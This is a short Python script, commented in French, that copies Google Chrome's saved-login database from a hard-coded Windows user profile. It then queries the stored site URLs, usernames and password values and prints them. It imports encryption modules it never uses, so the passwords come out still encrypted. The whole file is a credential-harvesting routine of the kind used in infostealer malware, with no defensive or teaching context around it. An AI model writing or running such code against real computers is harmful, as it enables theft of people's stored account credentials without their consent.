import os
import shutil
import sqlite3
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from cryptography.hazmat.backends import default_backend

password_path = "C:\\Users\\melvi\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

temp_password_path = "temp_password"
shutil.copyfile(password_path, temp_password_path)

# Connexion à la base de données SQLite
conn = sqlite3.connect(temp_password_path)
cursor = conn.cursor()

# Exécuter la requête SQL pour récupérer les mots de passe
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')


for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]
        print(f'URL: {origin_url}\nUsername: {username}\nPassword: {encrypted_password}\n')

conn.close()
os.remove(temp_password_path)